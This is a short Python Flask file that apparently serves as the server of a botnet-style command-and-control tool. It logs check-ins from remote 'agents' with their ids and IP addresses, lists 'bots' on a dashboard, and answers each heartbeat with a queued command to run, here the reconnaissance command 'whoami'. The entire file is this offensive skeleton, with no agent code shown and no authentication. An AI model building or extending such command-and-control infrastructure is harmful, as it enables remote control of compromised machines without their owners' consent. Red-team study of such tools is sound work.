from flask import Flask, render_template, jsonify, request

app = Flask(__name__)

# Simulating a command queue
current_command = "whoami" 

@app.route('/')
def dashboard():
    return render_template('index.html', count=0, bots=[]) # Placeholder for now

@app.route('/api/heartbeat', methods=['POST'])
def heartbeat():
    """
    Agents hit this endpoint to check in.
    """
    data = request.json
    print(f"[+] Heartbeat received from: {data.get('id')} ({data.get('ip')})")
    
    # The server responds with the current command to run
    return jsonify({
        "status": "online",
        "task": current_command
    })

if __name__ == '__main__':
    app.run(debug=True, port=5000)